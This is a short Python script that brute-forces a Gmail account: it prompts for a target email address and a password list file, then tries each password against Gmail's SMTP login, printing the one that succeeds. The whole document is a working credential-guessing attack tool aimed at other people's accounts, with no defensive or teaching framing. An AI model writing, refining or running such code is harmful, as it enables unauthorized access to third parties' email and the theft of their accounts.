import smtplib
import os 
import colorama
from termcolor import cprint

colorama.init()
os.system('color')

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter target email id: ")
print("                                   ")
passwf = input("Enter password file: ")
print("                                   ")
passwf = open(passwf, "r")

for password in passwf:
    try:
        smtpserver.login(user, password)
        cprint("Password found: %s" % password, 'green')
        break
    except smtplib.SMTPAuthenticationError:
        cprint("Wrong password: %s" % password, 'red')
